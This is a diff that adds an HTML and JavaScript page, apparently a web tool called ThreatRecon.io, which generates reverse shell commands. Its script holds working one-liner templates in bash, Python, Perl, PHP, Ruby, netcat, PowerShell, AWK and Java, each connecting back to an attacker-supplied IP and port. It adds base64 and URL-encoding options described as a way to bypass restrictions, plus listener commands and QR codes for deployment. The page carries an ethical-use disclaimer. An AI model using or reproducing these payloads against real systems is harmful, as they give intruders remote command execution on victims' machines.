@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ThreatRecon.io - Reverse Shell Generator</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        :root {
+            --primary: #1e1e1e;
+            --secondary: #2a2a2a;
+            --accent: #3a3a3a;
+            --highlight: #fe0000;
+            --highlight-dark: #c20000;
+            --text: #f4f4fa;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212; /* Midnight black */
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            background-color: var(--secondary);
+            padding: 20px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--text);
+            text-decoration: none;
+        }
+        
+        .logo span {
+            color: var(--highlight);
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .nav-links a {
+            color: var(--text);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .nav-links a:hover {
+            color: var(--highlight);
+        }
+        
+        .tool-container {
+            background-color: var(--secondary);
+            border-radius: 8px;
+            padding: 30px;
+            margin: 40px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            border-left: 4px solid var(--highlight);
+        }
+        
+        h1, h2, h3 {
+            color: var(--text);
+        }
+        
+        h1 {
+            font-size: 32px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        select, input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 4px;
+            border: 1px solid var(--accent);
+            background-color: var(--primary);
+            color: var(--text);
+            font-size: 16px;
+        }
+        
+        .btn {
+            display: inline-block;
+            background-color: var(--highlight);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 4px 10px rgba(254, 0, 0, 0.3);
+        }
+        
+        .btn:hover {
+            background-color: var(--highlight-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 14px rgba(254, 0, 0, 0.5);
+        }
+        
+        .btn-secondary {
+            background-color: var(--accent);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn-secondary:hover {
+            background-color: #4a4a4a;
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn-container {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .result-container {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: var(--accent);
+            border-radius: 4px;
+            position: relative;
+        }
+        
+        .result-container pre {
+            margin: 0;
+            padding: 20px;
+            background-color: var(--primary);
+            border-radius: 4px;
+            overflow-x: auto;
+            color: var(--text);
+            font-family: 'Courier New', Courier, monospace;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 30px;
+            right: 30px;
+            padding: 6px 12px;
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .ethical-checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 8px 12px;
+            border-radius: 4px;
+            background-color: rgba(254, 0, 0, 0.05);
+            white-space: nowrap;
+            overflow: visible;
+        }
+        
+        .ethical-checkbox {
+            margin-right: 10px;
+            min-width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+            accent-color: var(--highlight);
+        }
+        
+        .ethical-label {
+            margin: 0;
+            display: inline;
+            white-space: normal;
+        }
+        
+        .footer {
+            background-color: var(--secondary);
+            padding: 20px 0;
+            margin-top: 60px;
+            text-align: center;
+        }
+        
+        .disclaimer {
+            background-color: rgba(255, 59, 92, 0.1);
+            border-left: 4px solid var(--highlight);
+            padding: 15px;
+            margin: 30px 0;
+            font-size: 14px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            
+            .tool-container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <nav>
+                <a href="index.html" class="logo">Threat<span>Recon</span>.io</a>
+                <div class="nav-links">
+                    <a href="index.html">Home</a>
+                    <a href="#" class="active">Reverse Shells</a>
+                    <a href="#">Hash Cracker</a>
+                    <a href="#">Encoder/Decoder</a>
+                    <a href="#">About</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+    
+    <main class="container">
+        <h1>Reverse Shell Generator</h1>
+        
+        <div class="tool-container">
+            <h2>How to Use</h2>
+            <p>Reverse shells are commands that allow a remote connection back to your system from a target machine. Here's how to use this generator:</p>
+            <ol>
+                <li>Select the target OS/environment for proper shell recommendation</li>
+                <li>Choose the appropriate shell type for your target environment</li>
+                <li>Select a variant if available (different implementations work better in different environments)</li>
+                <li>Enter your attacker machine's IP address (where you'll be listening)</li>
+                <li>Choose a port to listen on (common choices: 443, 4444, 8080)</li>
+                <li>Choose obfuscation options if needed to bypass restrictions</li>
+                <li>Click "Generate Shell Command" to create the command</li>
+                <li>On your attacker machine, start a listener with the provided listener command</li>
+            </ol>
+            
+            <h3>Shell Types Guide</h3>
+            <ul>
+                <li><strong>Bash</strong> - Works on most Linux/Unix systems; TCP is most common, UDP for special cases</li>
+                <li><strong>Python</strong> - Python 3 only; Standard option works on most systems, PTY option provides a better terminal</li>
+                <li><strong>Perl</strong> - Alternative for systems where other methods fail; Standard is more compatible</li>
+                <li><strong>PHP</strong> - Useful for web servers; Alternative method helps bypass certain restrictions</li>
+                <li><strong>Ruby</strong> - Less common but useful alternative when other methods are blocked</li>
+                <li><strong>Netcat</strong> - The "traditional" variant requires netcat with -e support; Alternative uses FIFO for systems without -e</li>
+                <li><strong>PowerShell</strong> - For Windows targets; One-liner is more concise version</li>
+                <li><strong>AWK</strong> - Uncommon but useful when other tools are unavailable</li>
+                <li><strong>Java</strong> - For systems running Java where other methods are unavailable</li>
+            </ul>
+            
+            <h3>Testing Locally</h3>
+            <div style="background-color: var(--accent); padding: 15px; border-radius: 4px; margin-top: 10px;">
+                <h4 style="margin-top: 0;">How to Test Your Reverse Shell Locally:</h4>
+                <ol>
+                    <li>Open two terminal windows on your local machine</li>
+                    <li>In terminal #1, start the listener: <code>nc -lvnp 4444</code></li>
+                    <li>In terminal #2, run your generated payload (replace IP with 127.0.0.1)</li>
+                    <li>If successful, commands in terminal #1 will execute on terminal #2's shell</li>
+                </ol>
+                <p style="margin-bottom: 0;"><strong>Note:</strong> For Netcat testing, ensure you have the right version installed. Check with <code>nc -h</code> to see if your version supports the -e option.</p>
+            </div>
+        </div>
+        
+        <div class="tool-container">
+            <div class="form-group">
+                <label for="targetOS">Target OS/Environment:</label>
+                <select id="targetOS">
+                    <option value="linux">Linux</option>
+                    <option value="windows">Windows</option>
+                    <option value="webserver">Web Server</option>
+                    <option value="restricted">Restricted Shell</option>
+                    <option value="macos">macOS</option>
+                    <option value="iot">IoT Device</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="shellType">Shell Type:</label>
+                <select id="shellType">
+                    <option value="bash">Bash</option>
+                    <option value="python">Python</option>
+                    <option value="perl">Perl</option>
+                    <option value="php">PHP</option>
+                    <option value="ruby">Ruby</option>
+                    <option value="netcat">Netcat</option>
+                    <option value="powershell">PowerShell</option>
+                    <option value="awk">AWK</option>
+                    <option value="java">Java</option>
+                </select>
+            </div>
+            
+            <div class="form-group" id="subtypeContainer">
+                <label for="shellSubtype">Variant:</label>
+                <select id="shellSubtype">
+                    <!-- Options will be dynamically populated based on shell type -->
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="ipAddress">Listener IP Address:</label>
+                <input type="text" id="ipAddress" placeholder="e.g., 10.10.10.10">
+            </div>
+            
+            <div class="form-group">
+                <label for="portNumber">Listener Port:</label>
+                <input type="number" id="portNumber" placeholder="e.g., 4444" min="1" max="65535">
+            </div>
+            
+            <div class="form-group">
+                <label>Payload Obfuscation:</label>
+                <div style="display: flex; flex-wrap: wrap; gap: 15px; margin-top: 8px;">
+                    <div style="display: flex; align-items: center;">
+                        <input type="radio" id="obfuscationNone" name="obfuscation" value="none" checked style="margin-right: 5px;">
+                        <label for="obfuscationNone" style="margin: 0;">None</label>
+                    </div>
+                    <div style="display: flex; align-items: center;">
+                        <input type="radio" id="obfuscationBase64" name="obfuscation" value="base64" style="margin-right: 5px;">
+                        <label for="obfuscationBase64" style="margin: 0;">Base64</label>
+                    </div>
+                    <div style="display: flex; align-items: center;">
+                        <input type="radio" id="obfuscationURL" name="obfuscation" value="url" style="margin-right: 5px;">
+                        <label for="obfuscationURL" style="margin: 0;">URL Encode</label>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <div style="display: flex; align-items: center; background-color: rgba(254, 0, 0, 0.08); border-radius: 4px; margin-bottom: 20px; padding: 0;">
+                    <div style="padding: 10px 0 10px 10px;">
+                        <input type="checkbox" id="ethicalUseCheckbox" style="margin: 0; min-width: 20px; height: 20px;">
+                    </div>
+                    <div style="padding: 10px 10px 10px 15px;">
+                        <label for="ethicalUseCheckbox" style="margin: 0; line-height: 20px; cursor: pointer;">
+                            I accept that this tool is for authorized and educational use only, and I am responsible for how I use it.
+                        </label>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="btn-container">
+                <button id="generateBtn" class="btn" disabled>Generate Shell Command</button>
+                <button id="clearBtn" class="btn btn-secondary">Clear</button>
+            </div>
+            
+            <div class="result-container hidden" id="resultContainer">
+                <h3>Generated Command:</h3>
+                <pre id="commandOutput"></pre>
+                <button id="copyBtn" class="btn copy-btn">Copy</button>
+                
+                <div style="margin-top: 20px; border-top: 1px solid var(--accent); padding-top: 15px;">
+                    <h4>Listener Command:</h4>
+                    <pre id="listenerOutput">nc -lvnp <span id="listenerPort">4444</span></pre>
+                    <div style="display: flex; gap: 10px; margin-top: 10px;">
+                        <button id="copyListenerBtn" class="btn btn-secondary" style="font-size: 14px;">Copy Listener</button>
+                        <button id="toggleRlwrapBtn" class="btn btn-secondary" style="font-size: 14px;">Use rlwrap</button>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px; border-top: 1px solid var(--accent); padding-top: 15px;">
+                    <h4>QR Code for Mobile Deployment:</h4>
+                    <p style="font-size: 14px; color: #aaa;">Scan this QR code to quickly deploy the command on mobile devices.</p>
+                    <div style="display: flex; gap: 20px; align-items: flex-start; flex-wrap: wrap;">
+                        <div>
+                            <div id="qrcode" style="padding: 15px; background: white; border-radius: 4px;"></div>
+                            <div id="qrSizeControls" style="margin-top: 10px; display: none;">
+                                <label for="qrSizeSlider" style="font-size: 12px; display: block; margin-bottom: 5px;">Adjust QR Size:</label>
+                                <input type="range" id="qrSizeSlider" min="120" max="300" value="180" style="width: 100%;">
+                            </div>
+                        </div>
+                        <div style="flex: 1; min-width: 200px;">
+                            <button id="generateQRBtn" class="btn btn-secondary" style="font-size: 14px; margin-bottom: 10px;">Regenerate QR Code</button>
+                            <br>
+                            <button id="downloadQRBtn" class="btn btn-secondary" style="font-size: 14px; margin-bottom: 15px;" disabled>Download QR</button>
+                            
+                            <div id="rawPayloadContainer" style="margin-top: 15px;">
+                                <label for="rawPayload" style="font-size: 12px; display: block; margin-bottom: 5px;">Raw Payload for Manual Copy:</label>
+                                <textarea id="rawPayload" readonly style="width: 100%; height: 60px; font-size: 12px; background-color: var(--primary); color: var(--text); border: 1px solid var(--accent); padding: 8px; border-radius: 4px;"></textarea>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="disclaimer">
+            <strong>Ethical Use Warning:</strong> This tool is provided for educational purposes and legitimate security testing only. Always ensure you have explicit permission before executing these commands on any system. Unauthorized access to computer systems is illegal and unethical.
+        </div>
+    </main>
+    
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 ThreatRecon.io - All Rights Reserved</p>
+        </div>
+    </footer>
+    
+    <script>
+        // Shell templates
+        const shellTemplates = {
+            bash: {
+                tcp: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
+                udp: 'bash -i >& /dev/udp/{ip}/{port} 0>&1'
+            },
+            python: {
+                standard: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
+                pty: 'python3 -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\''
+            },
+            perl: {
+                standard: 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
+                alt: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
+            },
+            php: {
+                standard: 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
+                alt: '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{ip}/{port} 0>&1\'");?>'
+            },
+            ruby: 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
+            netcat: {
+                traditional: 'nc -e /bin/sh {ip} {port}',
+                alternative: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
+            },
+            powershell: {
+                standard: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
+                oneLiners: '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+            },
+            awk: 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
+            java: 'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]); p.waitFor()'
+        };
+        
+        // DOM elements
+        const shellTypeSelect = document.getElementById('shellType');
+        const shellSubtypeSelect = document.getElementById('shellSubtype');
+        const subtypeContainer = document.getElementById('subtypeContainer');
+        const targetOSSelect = document.getElementById('targetOS');
+        const ipAddressInput = document.getElementById('ipAddress');
+        const portNumberInput = document.getElementById('portNumber');
+        const ethicalUseCheckbox = document.getElementById('ethicalUseCheckbox');
+        const generateBtn = document.getElementById('generateBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const resultContainer = document.getElementById('resultContainer');
+        const commandOutput = document.getElementById('commandOutput');
+        const copyBtn = document.getElementById('copyBtn');
+        const listenerOutput = document.getElementById('listenerOutput');
+        const listenerPort = document.getElementById('listenerPort');
+        const copyListenerBtn = document.getElementById('copyListenerBtn');
+        const toggleRlwrapBtn = document.getElementById('toggleRlwrapBtn');
+        const generateQRBtn = document.getElementById('generateQRBtn');
+        const downloadQRBtn = document.getElementById('downloadQRBtn');
+        
+        // Update subtypes based on selected shell type
+        function updateSubtypes() {
+            const selectedType = shellTypeSelect.value;
+            const templateForType = shellTemplates[selectedType];
+            
+            // Clear existing options
+            shellSubtypeSelect.innerHTML = '';
+            
+            if (typeof templateForType === 'object' && !Array.isArray(templateForType)) {
+                // Show subtype selector if there are subtypes
+                subtypeContainer.classList.remove('hidden');
+                
+                // Add options for each subtype
+                for (const subtype in templateForType) {
+                    const option = document.createElement('option');
+                    option.value = subtype;
+                    
+                    // Format the subtype name for display
+                    let displayName = subtype.charAt(0).toUpperCase() + subtype.slice(1);
+                    
+                    // Set appropriate display names based on subtype
+                    if (subtype === 'tcp') displayName = 'TCP';
+                    if (subtype === 'udp') displayName = 'UDP';
+                    if (subtype === 'standard') displayName = 'Standard';
+                    if (subtype === 'pty') displayName = 'With PTY (Better Terminal)';
+                    if (subtype === 'alt') displayName = 'Alternative';
+                    if (subtype === 'traditional') displayName = 'Traditional (-e option)';
+                    if (subtype === 'alternative') displayName = 'Alternative (FIFO)';
+                    if (subtype === 'oneLiners') displayName = 'One-Liner';
+                    
+                    option.textContent = displayName;
+                    shellSubtypeSelect.appendChild(option);
+                }
+            } else {
+                // Hide subtype selector if there are no subtypes
+                subtypeContainer.classList.add('hidden');
+            }
+        }
+        
+        // Generate shell command
+        function generateShellCommand() {
+            const shellType = shellTypeSelect.value;
+            const shellSubtype = shellSubtypeSelect.value || null;
+            const ipAddress = ipAddressInput.value.trim();
+            const portNumber = portNumberInput.value.trim();
+            const obfuscationType = document.querySelector('input[name="obfuscation"]:checked').value;
+            
+            // Validate inputs
+            if (!ipAddress) {
+                alert('Please enter a valid IP address');
+                ipAddressInput.focus();
+                return;
+            }
+            
+            if (!portNumber || isNaN(parseInt(portNumber)) || parseInt(portNumber) < 1 || parseInt(portNumber) > 65535) {
+                alert('Please enter a valid port number (1-65535)');
+                portNumberInput.focus();
+                return;
+            }
+            
+            // Get the appropriate template
+            let template;
+            if (typeof shellTemplates[shellType] === 'object' && !Array.isArray(shellTemplates[shellType]) && shellSubtype) {
+                template = shellTemplates[shellType][shellSubtype];
+            } else {
+                template = shellTemplates[shellType];
+            }
+            
+            // Replace placeholders with actual values
+            let command = template
+                .replace(/{ip}/g, ipAddress)
+                .replace(/{port}/g, portNumber);
+            
+            // Apply obfuscation if selected
+            if (obfuscationType !== 'none') {
+                command = applyObfuscation(command, obfuscationType, shellType);
+            }
+            
+            // Display the result
+            commandOutput.textContent = command;
+            resultContainer.classList.remove('hidden');
+            
+            // Update listener command port
+            updateListenerPort();
+            
+            // Auto-generate QR code
+            generateQRCode();
+        }
+        
+        // Apply obfuscation to the command
+        function applyObfuscation(command, type, shellType) {
+            switch(type) {
+                case 'base64':
+                    const encoded = btoa(command);
+                    // Return appropriate decoder based on shell type
+                    if (shellType === 'powershell') {
+                        // PowerShell encoded command
+                        return `powershell -e ${btoa(unescape(encodeURIComponent(command)))}`;
+                    } else {
+                        // Bash/Linux encoded command
+                        return `echo ${encoded} | base64 -d | bash`;
+                    }
+                case 'url':
+                    return encodeURIComponent(command);
+                default:
+                    return command;
+            }
+        }
+        
+        // Copy command to clipboard
+        function copyToClipboard() {
+            const commandText = commandOutput.textContent;
+            navigator.clipboard.writeText(commandText).then(() => {
+                const originalText = copyBtn.textContent;
+                copyBtn.textContent = 'Copied!';
+                setTimeout(() => {
+                    copyBtn.textContent = originalText;
+                }, 2000);
+            }).catch(err => {
+                console.error('Could not copy text: ', err);
+            });
+        }
+        
+        // Clear form
+        function clearForm() {
+            ipAddressInput.value = '';
+            portNumberInput.value = '';
+            ethicalUseCheckbox.checked = false;
+            generateBtn.disabled = true;
+            resultContainer.classList.add('hidden');
+            
+            // Reset QR code
+            const qrContainer = document.getElementById('qrcode');
+            qrContainer.innerHTML = '';
+            downloadQRBtn.disabled = true;
+            document.getElementById('qrSizeControls').style.display = 'none';
+            document.getElementById('rawPayload').value = '';
+            qrcode = null;
+        }
+        
+        // Event listeners
+        shellTypeSelect.addEventListener('change', updateSubtypes);
+        targetOSSelect.addEventListener('change', updateRecommendedShell);
+        generateBtn.addEventListener('click', generateShellCommand);
+        clearBtn.addEventListener('click', clearForm);
+        copyBtn.addEventListener('click', copyToClipboard);
+        copyListenerBtn.addEventListener('click', copyListenerCommand);
+        toggleRlwrapBtn.addEventListener('click', toggleRlwrap);
+        portNumberInput.addEventListener('input', updateListenerPort);
+        generateQRBtn.addEventListener('click', generateQRCode);
+        downloadQRBtn.addEventListener('click', downloadQRCode);
+        
+        // Enable/disable generate button based on checkbox
+        ethicalUseCheckbox.addEventListener('change', function() {
+            generateBtn.disabled = !this.checked;
+        });
+        
+        // Initialize
+        updateSubtypes();
+        
+        // QR code object
+        let qrcode = null;
+        
+        // Function to generate QR code
+        function generateQRCode() {
+            const command = commandOutput.textContent;
+            
+            // Set raw payload text
+            document.getElementById('rawPayload').value = command;
+            
+            // Clear previous QR code
+            const qrContainer = document.getElementById('qrcode');
+            qrContainer.innerHTML = '';
+            
+            // Get size - adaptive based on payload length
+            let qrSize = 180; // default size
+            if (command.length > 120) {
+                // Show size controls for larger payloads
+                document.getElementById('qrSizeControls').style.display = 'block';
+                qrSize = document.getElementById('qrSizeSlider').value;
+            } else {
+                document.getElementById('qrSizeControls').style.display = 'none';
+            }
+            
+            // Generate new QR code
+            qrcode = new QRCode(qrContainer, {
+                text: command,
+                width: qrSize,
+                height: qrSize,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+            
+            // Enable download button
+            downloadQRBtn.disabled = false;
+        }
+        
+        // Handle QR size slider
+        if (document.getElementById('qrSizeSlider')) {
+            document.getElementById('qrSizeSlider').addEventListener('input', function() {
+                // Only regenerate if we already have a QR code
+                if (qrcode) {
+                    generateQRCode();
+                }
+            });
+        }
+        
+        // Function to download QR code
+        function downloadQRCode() {
+            if (!qrcode) return;
+            
+            // Get QR code as image
+            const canvas = document.querySelector('#qrcode canvas');
+            if (!canvas) return;
+            
+            // Convert to data URL
+            const dataURL = canvas.toDataURL('image/png');
+            
+            // Create download link
+            const downloadLink = document.createElement('a');
+            downloadLink.href = dataURL;
+            downloadLink.download = 'reverseshell_qrcode.png';
+            
+            // Trigger download
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+        }
+        
+        // Function to update the listener port display
+        function updateListenerPort() {
+            const port = portNumberInput.value.trim() || '4444';
+            listenerPort.textContent = port;
+        }
+        
+        // Function to toggle between nc and rlwrap nc
+        function toggleRlwrap() {
+            const currentCommand = listenerOutput.textContent;
+            if (currentCommand.startsWith('rlwrap')) {
+                listenerOutput.textContent = currentCommand.replace('rlwrap ', '');
+                toggleRlwrapBtn.textContent = 'Use rlwrap';
+            } else {
+                listenerOutput.textContent = 'rlwrap ' + currentCommand;
+                toggleRlwrapBtn.textContent = 'Remove rlwrap';
+            }
+        }
+        
+        // Function to copy listener command
+        function copyListenerCommand() {
+            const listenerCommand = listenerOutput.textContent;
+            navigator.clipboard.writeText(listenerCommand).then(() => {
+                const originalText = copyListenerBtn.textContent;
+                copyListenerBtn.textContent = 'Copied!';
+                setTimeout(() => {
+                    copyListenerBtn.textContent = originalText;
+                }, 2000);
+            }).catch(err => {
+                console.error('Could not copy text: ', err);
+            });
+        }
+        
+        // Function to update recommended shell based on OS
+        function updateRecommendedShell() {
+            const targetOS = targetOSSelect.value;
+            
+            // Save current selection to restore if user already chose something
+            const currentSelection = shellTypeSelect.value;
+            
+            switch(targetOS) {
+                case 'windows':
+                    highlightOption(shellTypeSelect, 'powershell');
+                    break;
+                case 'linux':
+                    highlightOption(shellTypeSelect, 'bash');
+                    break;
+                case 'webserver':
+                    highlightOption(shellTypeSelect, 'php');
+                    break;
+                case 'restricted':
+                    highlightOption(shellTypeSelect, 'netcat');
+                    break;
+                case 'macos':
+                    highlightOption(shellTypeSelect, 'bash');
+                    break;
+                case 'iot':
+                    highlightOption(shellTypeSelect, 'netcat');
+                    break;
+                default:
+                    // Do nothing
+            }
+            
+            // Restore user selection if they had one
+            if (currentSelection) {
+                shellTypeSelect.value = currentSelection;
+            }
+            
+            // Update subtypes for the new shell type
+            updateSubtypes();
+        }
+        
+        // Helper function to highlight recommended option
+        function highlightOption(selectElement, value) {
+            selectElement.value = value;
+            
+            // Reset all options
+            Array.from(selectElement.options).forEach(option => {
+                option.style.fontWeight = 'normal';
+                option.style.color = '';
+            });
+            
+            // Highlight the recommended option
+            const option = Array.from(selectElement.options).find(opt => opt.value === value);
+            if (option) {
+                option.style.fontWeight = 'bold';
+                option.style.color = 'var(--highlight)';
+            }
+        }
+    </script>
+</body>
+</html>
